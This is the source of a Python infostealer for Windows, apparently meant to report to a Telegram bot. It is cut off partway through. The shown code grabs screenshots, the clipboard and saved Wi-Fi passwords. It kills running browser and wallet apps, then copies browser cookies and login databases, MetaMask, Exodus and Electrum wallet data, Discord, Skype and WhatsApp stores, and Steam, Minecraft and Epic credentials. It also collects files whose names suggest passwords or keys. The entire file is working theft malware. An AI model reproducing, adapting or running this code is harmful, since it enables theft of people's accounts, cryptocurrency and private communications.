import platform
import psutil
import socket
import telebot
import pyautogui
import os
import time
from datetime import datetime
import subprocess
import zipfile
import shutil
from pathlib import Path
import signal
import sys
import traceback
import glob
import re
import io
from PIL import ImageGrab
import winreg

if platform.system() == 'Windows':
    try:
        import ctypes
        ctypes.windll.kernel32.SetProcessDPIAware()
        ctypes.windll.ntdll.RtlSetProcessPlaceholderCompatibilityMode(2)
    except:
        pass

BOT_TOKEN = "—Ç–æ–∫–µ–Ω_–±–æ—Ç–∞"
USER_ID = –≤–∞—à_–∞–π–¥–∏

bot = telebot.TeleBot(BOT_TOKEN)

MAX_PATH_LENGTH = 250

def fix_long_path(path):
    if platform.system() == 'Windows' and len(path) > MAX_PATH_LENGTH:
        if not path.startswith("\\\\?\\"):
            return "\\\\?\\" + os.path.abspath(path)
    return path

def safe_copy_file(src, dst):
    try:
        src = fix_long_path(src)
        dst = fix_long_path(dst)
        
        if os.path.getsize(src) > 100 * 1024 * 1024:
            print(f"–ü—Ä–æ–ø—É—Å–∫ —Ñ–∞–π–ª–∞ (—Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π): {src}")
            return False
            
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        
        shutil.copy2(src, dst)
        return True
    except (PermissionError, FileNotFoundError):
        return False
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ {src}: {e}")
        return False

def safe_copy_dir(src, dst):
    try:
        src = fix_long_path(src)
        dst = fix_long_path(dst)
        
        os.makedirs(dst, exist_ok=True)
        
        for item in os.listdir(src):
            src_item = os.path.join(src, item)
            dst_item = os.path.join(dst, item)
            
            if os.path.isdir(src_item):
                safe_copy_dir(src_item, dst_item)
            else:
                safe_copy_file(src_item, dst_item)
                
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ {src}: {e}")
        return False

def get_system_info():
    info = []
    info.append(f"üìä –û—Ç—á–µ—Ç –æ —Å–∏—Å—Ç–µ–º–µ üìä")
    info.append(f"üïí –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append(f"üíª –ò–º—è –∫–æ–º–ø—å—é—Ç–µ—Ä–∞: {socket.gethostname()}")
    info.append(f"üñ•Ô∏è –û–°: {platform.system()} {platform.version()}")
    info.append(f"üîß –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {platform.processor()}")
    
    cpu_info = f"üîÑ CPU –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: {psutil.cpu_percent()}%"
    info.append(cpu_info)
    
    memory = psutil.virtual_memory()
    memory_info = f"üß† –ü–∞–º—è—Ç—å: {memory.percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ"
    memory_info += f" ({round(memory.used/1024/1024/1024, 2)} GB –∏–∑ {round(memory.total/1024/1024/1024, 2)} GB)"
    info.append(memory_info)
    
    disk = psutil.disk_usage('/')
    disk_info = f"üíæ –î–∏—Å–∫: {disk.percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ"
    disk_info += f" ({round(disk.used/1024/1024/1024, 2)} GB –∏–∑ {round(disk.total/1024/1024/1024, 2)} GB)"
    info.append(disk_info)
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        info.append(f"üåê –õ–æ–∫–∞–ª—å–Ω—ã–π IP: {local_ip}")
    except:
        info.append("üåê –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ª–æ–∫–∞–ª—å–Ω—ã–π IP")
    
    try:
        import requests
        external_ip = requests.get('https://api.ipify.org').text
        info.append(f"üåç –í–Ω–µ—à–Ω–∏–π IP: {external_ip}")
    except:
        info.append("üåç –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤–Ω–µ—à–Ω–∏–π IP")
        
    return "\n".join(info)

def take_screenshot():
    screenshot_path = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_clipboard():
    clipboard_file = "clipboard.txt"
    clipboard_image = "clipboard.png"

    try:
        img = ImageGrab.grabclipboard()
        if img:
            img.save(clipboard_image)
            return clipboard_image
    except:
        pass
    
    try:
        process = subprocess.Popen(
            ['powershell', '-command', 'Get-Clipboard'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, _ = process.communicate()
        
        if stdout.strip():
            with open(clipboard_file, 'w', encoding='utf-8') as f:
                f.write(stdout)
            return clipboard_file
    except:
        pass
    
    return None

def get_installed_programs():
    programs_file = "installed_programs.txt"
    programs = []
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if "InstallDate" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "Unknown"
                    programs.append(f"{program_name} - {install_date}")
                except:
                    pass
            except:
                pass
            
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(0, winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    program_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if "InstallDate" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else "Unknown"
                    programs.append(f"{program_name} - {install_date}")
                except:
                    pass
            except:
                pass
                
        if programs:
            with open(programs_file, 'w', encoding='utf-8') as f:
                f.write("Installed Programs:\n")
                f.write("\n".join(sorted(programs)))
            return programs_file
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º: {e}")
    
    return None

def get_saved_wifi():
    wifi_file = "saved_wifi.txt"
    
    try:
        profiles_cmd = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True, encoding='cp866')
        profile_names = re.findall(r"–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\s+:\s(.*)", profiles_cmd.stdout)
        
        if not profile_names:
            profile_names = re.findall(r"All User Profile\s+:\s(.*)", profiles_cmd.stdout)
        
        wifi_data = ["Saved Wi-Fi Networks:"]
        
        for name in profile_names:
            name = name.strip()
            try:
                profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], 
                                             capture_output=True, text=True, encoding='cp866')
                
                password = re.search(r"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞\s+:\s(.*)", profile_info.stdout)
                if not password:
                    password = re.search(r"Key Content\s+:\s(.*)", profile_info.stdout)
                
                if password:
                    wifi_data.append(f"SSID: {name} | Password: {password.group(1).strip()}")
                else:
                    wifi_data.append(f"SSID: {name} | Password: Not found")
            except:
                wifi_data.append(f"SSID: {name} | Error retrieving password")
        
        with open(wifi_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(wifi_data))
        
        return wifi_file
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö Wi-Fi —Å–µ—Ç–µ–π: {e}")
    
    return None

def get_powershell_history():
    ps_history_path = os.path.join(os.getenv('USERPROFILE', ''), 
                                 'AppData', 'Roaming', 'Microsoft', 
                                 'Windows', 'PowerShell', 'PSReadLine', 
                                 'ConsoleHost_history.txt')
    
    if os.path.exists(ps_history_path):
        return ps_history_path
    
    return None

def close_applications():
    print("–ó–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –ø–µ—Ä–µ–¥ —Å–±–æ—Ä–æ–º –¥–∞–Ω–Ω—ã—Ö...")
    
    processes_to_close = [
        "telegram.exe", 
        "Telegram.exe",
        "chrome.exe", 
        "msedge.exe", 
        "brave.exe", 
        "opera.exe",
        "RobloxPlayerBeta.exe",
        "RobloxStudioBeta.exe",
        "firefox.exe",
        "Discord.exe",
        "Skype.exe",
        "WhatsApp.exe",
        "Exodus.exe",
        "Electrum.exe",
        "Steam.exe",
        "SteamService.exe",
        "Epic Games Launcher.exe",
        "EpicGamesLauncher.exe"
    ]
    
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            process_name = proc.info['name']
            if any(p.lower() in process_name.lower() for p in processes_to_close):
                print(f"–ó–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞: {process_name} (PID: {proc.info['pid']})")
                try:
                    process = psutil.Process(proc.info['pid'])
                    process.terminate()
                    gone, alive = psutil.wait_procs([process], timeout=3)
                    
                    if process in alive:
                        process.kill()
                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ {process_name}: {e}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    time.sleep(2)
    print("–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∑–∞–∫—Ä—ã—Ç—ã")

def collect_browser_data(temp_dir):
    print("–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤...")
    browser_dir = os.path.join(temp_dir, 'Browser_Data')
    os.makedirs(browser_dir, exist_ok=True)
    
    browser_paths = {
        'Chrome': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'),
        },
        'Edge': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data'),
        },
        'Brave': {
            'cookies': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
            'history': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
            'bookmarks': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data'),
        },
        'Opera': {
            'cookies': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Network', 'Cookies'),
            'login_data': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Login Data'),
            'history': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'History'),
            'bookmarks': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Bookmarks'),
            'web_data': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable', 'Web Data'),
        },
        'Firefox': {
            'profiles': os.path.join(os.getenv('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
        }
    }
    
    for browser, data_paths in browser_paths.items():
        browser_specific_dir = os.path.join(browser_dir, browser)
        os.makedirs(browser_specific_dir, exist_ok=True)
        
        if browser == 'Firefox':
            profiles_path = data_paths['profiles']
            if os.path.exists(profiles_path):
                try:
                    profiles = glob.glob(os.path.join(profiles_path, '*.default*'))
                    for profile in profiles:
                        profile_name = os.path.basename(profile)
                        profile_dir = os.path.join(browser_specific_dir, profile_name)
                        os.makedirs(profile_dir, exist_ok=True)
                        
                        target_files = ['logins.json', 'key4.db', 'cookies.sqlite', 'places.sqlite', 'formhistory.sqlite']
                        for file in target_files:
                            source_file = os.path.join(profile, file)
                            if os.path.exists(source_file):
                                try:
                                    shutil.copy2(source_file, os.path.join(profile_dir, file))
                                    print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª Firefox: {file}")
                                except Exception as e:
                                    print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ Firefox {file}: {e}")
                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ø—Ä–æ—Ñ–∏–ª–µ–π Firefox: {e}")
        else:
            for data_type, path in data_paths.items():
                if os.path.exists(path):
                    try:
                        dest_file = os.path.join(browser_specific_dir, data_type)
                        shutil.copy2(path, dest_file)
                        print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª {browser}: {data_type}")
                    except Exception as e:
                        print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ {browser} {data_type}: {e}")
    
    try:
        chrome_extensions = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
        if os.path.exists(chrome_extensions):
            metamask_id = 'nkbihfbeogaeaoehlefnkodbefgpgknn'
            metamask_path = os.path.join(chrome_extensions, metamask_id)
            
            if os.path.exists(metamask_path):
                metamask_dir = os.path.join(browser_dir, 'Metamask')
                os.makedirs(metamask_dir, exist_ok=True)
                
                versions = os.listdir(metamask_path)
                if versions:
                    latest_version = sorted(versions)[-1]
                    metamask_data = os.path.join(metamask_path, latest_version, 'Local Extension Settings', metamask_id)
                    
                    if os.path.exists(metamask_data):
                        try:
                            shutil.copytree(metamask_data, os.path.join(metamask_dir, 'Data'))
                            print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ Metamask")
                        except Exception as e:
                            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö Metamask: {e}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π –±—Ä–∞—É–∑–µ—Ä–∞: {e}")
    
    return browser_dir

def collect_messenger_data(temp_dir):
    print("–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–æ–≤...")
    messenger_dir = os.path.join(temp_dir, 'Messenger_Data')
    os.makedirs(messenger_dir, exist_ok=True)
    
    discord_path = os.path.join(os.getenv('APPDATA', ''), 'discord', 'Local Storage', 'leveldb')
    if os.path.exists(discord_path):
        discord_dir = os.path.join(messenger_dir, 'Discord')
        try:
            shutil.copytree(discord_path, os.path.join(discord_dir, 'leveldb'))
            print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ Discord")
        except Exception as e:
            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö Discord: {e}")
    
    skype_path = os.path.join(os.getenv('APPDATA', ''), 'Skype')
    if os.path.exists(skype_path):
        try:
            user_folders = [f for f in os.listdir(skype_path) if not f.startswith('.') and os.path.isdir(os.path.join(skype_path, f))]
            
            if user_folders:
                skype_dir = os.path.join(messenger_dir, 'Skype')
                os.makedirs(skype_dir, exist_ok=True)
                
                for user in user_folders:
                    user_path = os.path.join(skype_path, user)
                    if os.path.isdir(user_path) and len(user) > 3:
                        try:
                            shutil.copytree(user_path, os.path.join(skype_dir, user))
                            print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ Skype –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {user}")
                        except Exception as e:
                            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö Skype –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user}: {e}")
        except Exception as e:
            print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö Skype: {e}")
    
    whatsapp_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'WhatsApp')
    if os.path.exists(whatsapp_path):
        whatsapp_dir = os.path.join(messenger_dir, 'WhatsApp')
        os.makedirs(whatsapp_dir, exist_ok=True)
        
        important_dirs = ['Databases', 'Local Storage']
        for dir_name in important_dirs:
            dir_path = os.path.join(whatsapp_path, dir_name)
            if os.path.exists(dir_path):
                try:
                    shutil.copytree(dir_path, os.path.join(whatsapp_dir, dir_name))
                    print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ WhatsApp: {dir_name}")
                except Exception as e:
                    print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö WhatsApp {dir_name}: {e}")
    
    return messenger_dir

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    
    return roblox_cookies_path if os.path.exists(roblox_cookies_path) else None

def collect_crypto_wallets(temp_dir):
    print("–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª—å–∫–æ–≤...")
    crypto_dir = os.path.join(temp_dir, 'Crypto_Wallets')
    os.makedirs(crypto_dir, exist_ok=True)
    
    exodus_path = os.path.join(os.getenv('APPDATA', ''), 'Exodus')
    if os.path.exists(exodus_path):
        exodus_dir = os.path.join(crypto_dir, 'Exodus')
        try:
            os.makedirs(exodus_dir, exist_ok=True)
            
            key_paths = ['exodus.wallet.aes.json', 'window-state.json', 'seed.seco', 'passphrase.seco']
            
            for item in os.listdir(exodus_path):
                item_path = os.path.join(exodus_path, item)
                
                if os.path.isfile(item_path) and item in key_paths:
                    dst_path = os.path.join(exodus_dir, item)
                    if safe_copy_file(item_path, dst_path):
                        print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª Exodus: {item}")
                
                elif item == 'localStorage':
                    storage_path = os.path.join(exodus_path, 'localStorage')
                    if os.path.exists(storage_path):
                        dst_path = os.path.join(exodus_dir, 'localStorage')
                        if safe_copy_dir(storage_path, dst_path):
                            print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ –ª–æ–∫–∞–ª—å–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ Exodus")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö Exodus: {e}")
    
    electrum_wallets_path = os.path.join(os.getenv('APPDATA', ''), 'Electrum', 'wallets')
    if os.path.exists(electrum_wallets_path):
        electrum_dir = os.path.join(crypto_dir, 'Electrum')
        os.makedirs(electrum_dir, exist_ok=True)
        wallets_dir = os.path.join(electrum_dir, 'wallets')
        if safe_copy_dir(electrum_wallets_path, wallets_dir):
            print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –∫–æ—à–µ–ª—å–∫–∏ Electrum")
    
    wallet_extensions = ['.wallet', '.dat', '.json', '.key']
    wallet_keywords = ['wallet', 'crypto', 'bitcoin', 'ethereum', 'ripple', 'litecoin', 
                       'private', 'seed', 'key', 'keys', 'backup', 'btc', 'eth']
    
    max_depth = 3
    max_files = 50
    files_found = 0
    
    search_paths = [
        os.path.join(os.getenv('USERPROFILE', ''), 'Documents'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Desktop'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Downloads')
    ]
    
    misc_wallets_dir = os.path.join(crypto_dir, 'Misc_Wallets')
    os.makedirs(misc_wallets_dir, exist_ok=True)
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        for root, dirs, files in os.walk(search_path):
            relative_path = os.path.relpath(root, search_path)
            depth = len(relative_path.split(os.sep))
            if depth > max_depth:
                dirs[:] = []
                continue
                
            for file in files:
                if files_found >= max_files:
                    break
                    
                file_lower = file.lower()
                if any(file_lower.endswith(ext) for ext in wallet_extensions) or any(keyword in file_lower for keyword in wallet_keywords):
                    try:
                        file_path = os.path.join(root, file)
                        
                        if os.path.getsize(file_path) > 10 * 1024 * 1024:
                            continue
                            
                        simple_path = f"{os.path.basename(search_path)}_{depth}_{file}"
                        dest_path = os.path.join(misc_wallets_dir, simple_path)
                        
                        if safe_copy_file(file_path, dest_path):
                            print(f"  –ù–∞–π–¥–µ–Ω –∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤–æ–∑–º–æ–∂–Ω—ã–π —Ñ–∞–π–ª –∫–æ—à–µ–ª—å–∫–∞: {simple_path}")
                            files_found += 1
                    except Exception:
                        continue
            
            if files_found >= max_files:
                break
    
    return crypto_dir

def collect_game_data(temp_dir):
    print("–°–±–æ—Ä –∏–≥—Ä–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö...")
    games_dir = os.path.join(temp_dir, 'Game_Data')
    os.makedirs(games_dir, exist_ok=True)
    
    steam_path = os.path.join(os.getenv('ProgramFiles(x86)', ''), 'Steam')
    if os.path.exists(steam_path):
        steam_dir = os.path.join(games_dir, 'Steam')
        os.makedirs(steam_dir, exist_ok=True)
        
        config_path = os.path.join(steam_path, 'config')
        if os.path.exists(config_path):
            try:
                shutil.copytree(config_path, os.path.join(steam_dir, 'config'))
                print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Steam")
            except Exception as e:
                print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ Steam: {e}")
        
        for file in os.listdir(steam_path):
            if file.startswith('ssfn'):
                try:
                    shutil.copy2(os.path.join(steam_path, file), os.path.join(steam_dir, file))
                    print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ç–æ–∫–µ–Ω Steam: {file}")
                except Exception as e:
                    print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ç–æ–∫–µ–Ω–∞ Steam {file}: {e}")
    
    minecraft_path = os.path.join(os.getenv('APPDATA', ''), '.minecraft')
    if os.path.exists(minecraft_path):
        minecraft_dir = os.path.join(games_dir, 'Minecraft')
        os.makedirs(minecraft_dir, exist_ok=True)
        
        launcher_profiles = os.path.join(minecraft_path, 'launcher_profiles.json')
        if os.path.exists(launcher_profiles):
            try:
                shutil.copy2(launcher_profiles, os.path.join(minecraft_dir, 'launcher_profiles.json'))
                print("  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –ø—Ä–æ—Ñ–∏–ª–∏ –∑–∞–ø—É—Å–∫–∞ Minecraft")
            except Exception as e:
                print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –ø—Ä–æ—Ñ–∏–ª–µ–π Minecraft: {e}")
        
        auth_files = ['launcher_accounts.json', 'launcher_msa_credentials.bin', 'launcher_settings.json']
        for file in auth_files:
            file_path = os.path.join(minecraft_path, file)
            if os.path.exists(file_path):
                try:
                    shutil.copy2(file_path, os.path.join(minecraft_dir, file))
                    print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ Minecraft: {file}")
                except Exception as e:
                    print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ Minecraft {file}: {e}")
    
    epic_path = os.path.join(os.getenv('LOCALAPPDATA', ''), 'EpicGamesLauncher')
    if os.path.exists(epic_path):
        epic_dir = os.path.join(games_dir, 'Epic_Games')
        os.makedirs(epic_dir, exist_ok=True)
        
        saved_path = os.path.join(epic_path, 'Saved')
        if os.path.exists(saved_path):
            try:
                for folder in ['Config', 'Data']:
                    folder_path = os.path.join(saved_path, folder)
                    if os.path.exists(folder_path):
                        shutil.copytree(folder_path, os.path.join(epic_dir, folder))
                        print(f"  –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ Epic Games: {folder}")
            except Exception as e:
                print(f"  –û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö Epic Games: {e}")
    
    return games_dir

def find_sensitive_files(temp_dir):
    print("–ü–æ–∏—Å–∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤...")
    sensitive_dir = os.path.join(temp_dir, 'Sensitive_Files')
    os.makedirs(sensitive_dir, exist_ok=True)
    
    sensitive_keywords = [
        'password', '–ø–∞—Ä–æ–ª—å', 'login', '–ª–æ–≥–∏–Ω', 'secret', '—Å–µ–∫—Ä–µ—Ç', 'private', 
        'crypto', 'wallet', '–∫–æ—à–µ–ª–µ–∫', 'account', '–∞–∫–∫–∞—É–Ω—Ç', 'token', '—Ç–æ–∫–µ–Ω', 
        'key', '–∫–ª—é—á', 'seed', '—Å–∏–¥', 'mnemonic', '–º–Ω–µ–º–æ–Ω–∏–∫', 'credentials',
        'credit card', '–±–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞', '–±–∞–Ω–∫', 'card', '–∫–∞—Ä—Ç–∞'
    ]
    
    doc_extensions = [
        '.txt', '.doc', '.docx', '.pdf', '.xlsx', '.xls', '.rtf', '.odt', 
        '.csv', '.json', '.xml', '.ini', '.conf', '.cfg'
    ]
    
    search_paths = [
        os.path.join(os.getenv('USERPROFILE', ''), 'Documents'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Desktop'),
        os.path.join(os.getenv('USERPROFILE', ''), 'Downloads')
    ]
    
    max_size = 5 * 1024 * 1024
    
    max_depth = 3
    max_files = 30
    
    files_found = 0
    
    for search_path in search_paths:
        if not os.path.exists(search_path):
            continue
            
        try:
            for root, dirs, files in os.walk(search_path):
                relative_path = os.path.relpath(root, search_path)
                depth = len(relative_path.split(os.sep))
                if depth > max_depth:
                    dirs[:] = []
                    continue
                
                for file in files:
                    if files_found >= max_files:
                        break
                        
                    if any(file.lower().endswith(ext) for ext in doc_extensions):
                        try:
                            file_path = os.path.join(root, file)
                            
                            if not os.path.exists(file_path) or os.path.getsize(file_path) > max_size:
                                continue
                                
                            file_lower = file.lower()
                            
                            if any(keyword in file_lower for keyword in sensitive_keywords):
                                simple_path = f"{os.path.basename(search_path)}_{depth}_{file}"
                                dest_path = os.path.join(sensitive_dir, simple_path)
                                
                                if safe_copy_file(file_path, dest_path):
